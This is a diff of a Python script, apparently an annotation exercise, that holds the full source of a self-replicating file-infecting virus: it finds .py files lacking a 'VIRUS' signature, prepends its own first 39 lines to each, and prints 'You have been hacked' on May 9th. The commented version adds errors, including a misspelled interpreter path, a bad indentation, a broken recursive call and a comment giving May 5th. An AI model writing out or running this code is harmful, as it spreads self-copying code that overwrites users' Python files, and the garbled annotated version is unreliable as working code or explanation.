@@ -1,45 +1,104 @@
-# Start interpreter
-#!/usr/bin/python
-import os # This line imports the security library utility modules 
-import datetime # This lines imports the date and time
+# Begin using the python interpreter
+#!/user/bin/python 
 
-SIGNATURE = "VIRUS" # The lines is the initial creation of the variable
+# The `import` statements will bring os and datetime libraries to be used in this script
+import os
+import datetime
 
-def locate(path): # This line is defining the function to locate all the parameters within the ()
-    files_targeted = [] # This line will access the target files lists within the brackets array
-    filelist = os.listdir(path) # This line will return the list containing the names in the directory given by the path
-    for fname in filelist: # 
+# Assign a string virus to the variable
+SIGNATURE = "VIRUS"
+
+# Function to output an array that will insert files that do not have the word virus and append it to the array
+def locate(path):
+
+    # Create an empty array list
+    files_targeted = []
+    # List the directory from the path argument that this function is taking in      and assign it to filelist
+ 	filelist = os.listdir(path)
+
+    # Run a for loop to access the files/folders in the directory path
+    for fname in filelist:
+
+    # If the specified path is an existing directory it will return boolean true otherwise false
         if os.path.isdir(path+"/"+fname):
-            files_targeted.extend(locate(path+"/"+fname))
+
+            # hitting true from previous if logic, the following statement will recurse the locate function again to check if there are more folders in this directory
+            files_targeted.extend((locatepath+"/"+fname))
+
+        # If the file's third index from the back is a python file it will enter into this if logic
         elif fname[-3:] == ".py":
+
+            # Set infected variable as false
             infected = False
+
+            # Running for loop iteration to print line by line
             for line in open(path+"/"+fname):
+
+                # If the line in the python file contains word, virus, then it will set variable to true and break out of this for loop
                 if SIGNATURE in line:
                     infected = True
                     break
+
+            # If the previous “if” logic does not succeed, then the python file didn't contain virus so infected will be still set to false, it will hit this logic and put the file into the files_targeted array
             if infected == False:
                 files_targeted.append(path+"/"+fname)
+
+    # Return the array at the end
     return files_targeted
-
+# This function is designed to override python files that doesn't have virus string and concatenating the virus file with current files content.
 def infect(files_targeted):
+
+    # Print absolute path to the given file
     virus = open(os.path.abspath(__file__))
+
+    #Declare a variable called virusstring and attach it with empty string
     virusstring = ""
-    for i,line in enumerate(virus):
+
+    #Run the for loop to access the file and output each line in that file
+    for i, line in enumerate(virus):
+
+        # if the i is greater than or equal 0 and i is less than 39 then this if logic will hit
         if i&gt;=0 and i &lt;39:
+
+            # Store each line3 within line 0 to line 39 of string into the `virusstring` variable
             virusstring += line
+
+    # Close the open file from the memory
     virus.close
+
+    # Run a for loop to access the filename withtin the files_targeted array
     for fname in files_targeted:
+
+        # Declare a variable called f and assign the open file in the files_targeted array to the variable f
         f = open(fname)
+
+        # Declare a variable and assign all of the lines within the file to the variable
         temp = f.read()
+
+        # Closing the f file from the memory
         f.close()
+
+        # Open the file this time with writing modifier, and override the fname file
         f = open(fname,"w")
+
+        # Write the long texts of string that’s previously stored from virusstring and concatenate it to the temp variable that has all of the lines from f file.
         f.write(virusstring + temp)
+
+        # Closing the file from the memory
         f.close()
 
+# Validate current date is May 9th and print out user has been hacked
 def detonate():
-    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
-        print "You have been hacked"
 
+    # if the current date is May 9th then execute following code block
+    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
+        # printing to the terminal that you have been hacked.
+        print "You have been hacked"# these are where all of the function will be invoked and executed.
+## Variable is storing the list that had output from locate function call
 files_targeted = locate(os.path.abspath(""))
+
+# Call the infect function with output array that is resulted from locate function
 infect(files_targeted)
+
+# Invoke function detonate to print user has been hacked if the date is May 5th.
 detonate()
